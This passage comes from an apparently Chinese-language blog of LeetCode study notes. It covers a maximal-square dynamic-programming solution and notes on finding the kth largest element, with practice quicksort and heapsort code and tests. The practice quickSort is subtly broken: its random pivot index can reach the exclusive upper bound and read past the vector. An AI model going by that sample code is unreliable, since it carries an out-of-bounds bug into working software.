class="token punctuation">]</span> <span class="token operator">=</span> ans<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> nums<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 题目设定：输出数组的空间不考虑</span>        <span class="token comment">// 所以将一侧的乘积数组作为输出数组</span>        <span class="token comment">// 而另一侧则只需要记住该元素相关的乘积，而不是乘积数组，因此只需要一个变量记录</span>        <span class="token keyword">int</span> right <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment">// 该值右侧所有元素的乘积</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            ans<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> ans<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> right<span class="token punctuation">;</span>            right <span class="token operator">*=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// 向左更新right</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> ans<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li></ol><h3 id="最大正方形">2023-11-28 <ahref="https://leetcode.cn/problems/maximal-square/description/">221.最大正方形</a></h3><h4 id="我思-4">我思</h4><ol type="1"><li>记录当时图形的<strong>四个顶角坐标</strong></li><li>为了保证<strong>正方形</strong>，我们需要王<strong>四个方向</strong><em>同时</em>扩充1列+1行<ol type="1"><li>检查扩充的那一列/行是否<strong>全是1</strong></li></ol></li><li></li></ol><h4 id="实现-4">实现</h4><ol type="1"><li><p>法1：暴力</p></li><li><p>法2：dp</p><ol type="1"><li><p>考虑<code>dp(i，j)</code>的含义：以<code>(i，j)</code>为右下角构成的正方形的最大边长</p><ol type="1"><li>为什么不是左上角？假设代表左上角：则相邻的点的值还未知</li></ol></li><li><p>关键，<strong>转移方程</strong>：<code>dp(i,j)=min(dp(i−1,j),dp(i−1,j−1),dp(i,j−1))+1</code></p><ol type="1"><li>当这相邻三个点的值最小值为0时，这个正方形都无法扩展</li><li>当...最小值为1时，这个正方形边长增量为1</li><li>当为2时，画图包裹区域法<imgsrc="https://s2.loli.net/2023/11/28/GEQScVDKLN3wkb6.png"alt="image-20231128041105749" /><ol type="1"><li>只有保证最小值为2，才能使得边长为3的正方形区域完全被包裹</li></ol></li></ol></li><li><p>Code</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> <span class="token function">maximalSquare</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token operator">&amp;</span> matrix<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> row <span class="token operator">=</span> matrix<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> col <span class="token operator">=</span> matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>row <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> col <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">int</span> ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">dp</span><span class="token punctuation">(</span>row<span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>col<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> row<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> col<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'1'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 注意是char型</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> j <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span><span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                                       dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span>                                   <span class="token number">1</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>                ans <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">int</span> maxSquare <span class="token operator">=</span> ans <span class="token operator">*</span> ans<span class="token punctuation">;</span>        <span class="token keyword">return</span> ans <span class="token operator">*</span> ans<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li></ol></li></ol><h3 id="数组中的第k个最大元素">2023-11-21 <ahref="https://leetcode.cn/problems/kth-largest-element-in-an-array/description/">215.数组中的第K个最大元素</a></h3><h4 id="我思-5">我思</h4><ol type="1"><li>要保证<code>O(n)</code>时间复杂度，肯定不能排序</li><li>思路：<ol type="1"><li>遍历所有元素，给出一个足够大的数组<code>a</code>，将值为<code>x</code>的元素放在<code>a[x]</code></li><li>再次遍历到 存在元素的第<code>k</code>个位置</li></ol></li></ol><h4 id="实现-5">实现</h4><ol type="1"><li><p>复习一下<code>快排</code></p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector></span></span><span class="token keyword">void</span> <span class="token function">quickSort</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> left<span class="token punctuation">,</span> <span class="token keyword">int</span> right<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">&lt;</span> right<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> random <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token punctuation">(</span>right <span class="token operator">-</span> left <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> left<span class="token punctuation">;</span>        <span class="token keyword">int</span> pivot <span class="token operator">=</span> nums<span class="token punctuation">[</span>random<span class="token punctuation">]</span><span class="token punctuation">;</span>        std<span class="token double-colon punctuation">::</span><span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>random<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> j <span class="token operator">=</span> left<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> left <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> right<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> pivot<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                std<span class="token double-colon punctuation">::</span><span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                j<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        std<span class="token double-colon punctuation">::</span><span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">quickSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> left<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">quickSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">printVector</span><span class="token punctuation">(</span><span class="token keyword">const</span> std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> num <span class="token operator">:</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> num <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Test case 1: Empty vector</span>    std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> nums1<span class="token punctuation">;</span>    <span class="token function">quickSort</span><span class="token punctuation">(</span>nums1<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> nums1<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Test case 1: "</span><span class="token punctuation">;</span>    <span class="token function">printVector</span><span class="token punctuation">(</span>nums1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Test case 2: Vector with one element</span>    std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> nums2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token function">quickSort</span><span class="token punctuation">(</span>nums2<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> nums2<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Test case 2: "</span><span class="token punctuation">;</span>    <span class="token function">printVector</span><span class="token punctuation">(</span>nums2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Test case 3: Vector with multiple elements</span>    std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> nums3 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token function">quickSort</span><span class="token punctuation">(</span>nums3<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> nums3<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Test case 3: "</span><span class="token punctuation">;</span>    <span class="token function">printVector</span><span class="token punctuation">(</span>nums3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Test case 4: Vector with duplicate elements</span>    std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> nums4 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token function">quickSort</span><span class="token punctuation">(</span>nums4<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> nums4<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Test case 4: "</span><span class="token punctuation">;</span>    <span class="token function">printVector</span><span class="token punctuation">(</span>nums4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p>复习一下<code>堆排序</code></p><ol type="1"><li><p><code>assert</code><imgsrc="https://s2.loli.net/2023/11/22/JrzsMOkHV7Gpc14.png"alt="image-20231122011536779" /></p></li><li><p>code</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cassert></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token comment">//  调整堆</span><span class="token keyword">void</span> <span class="token function">heapify</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> indexLargest <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token keyword">int</span> left <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> right <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token comment">// 如果左子节点大于根节点</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">&lt;</span> n <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>indexLargest<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        indexLargest <span class="token operator">=</span> left<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 如果右子节点大于根节点</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>right <span class="token operator">&lt;</span> n <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>right<span class="token punctuation">]</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>indexLargest<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        indexLargest <span class="token operator">=</span> right<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 调整以i为根节点的树</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">!=</span> indexLargest<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 最大节点不是根节点</span>        <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>indexLargest<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// indexLargest：是与根节点产生交换的节点下标，以此为根节点的子树也可能需要调整</span>        <span class="token function">heapify</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> n<span class="token punctuation">,</span> indexLargest<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 堆排序</span><span class="token keyword">void</span> <span class="token function">heapSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 自底向上调整：构建大根堆,从最后一个非叶子节点开始</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n <span class="token operator">/</span> <span class="token number">2</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">heapify</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> n<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 删除堆顶元素并向下重新调整</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 从根节点开始调整</span>        <span class="token function">heapify</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">testHeapSort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Test Case 1: Empty vector</span>    <span class="token punctuation">&#123;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> nums<span class="token punctuation">;</span>        <span class="token function">heapSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assert</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// Test Case 2: Vector with one element</span>    <span class="token punctuation">&#123;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> nums <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token function">heapSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assert</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assert</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// Test Case 3: Vector with multiple elements in random order</span>    <span class="token punctuation">&#123;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> nums <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token function">heapSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assert</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assert</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assert</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assert</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assert</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assert</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// Test Case 4: Vector with duplicate elements</span>    <span class="token punctuation">&#123;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> nums <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token function">heapSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assert</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assert</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assert</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assert</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assert</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assert</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assert</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// Test Case 5: Vector already sorted in ascending order</span>    <span class="token punctuation">&#123;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> nums <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token function">heapSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assert</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assert</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assert</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        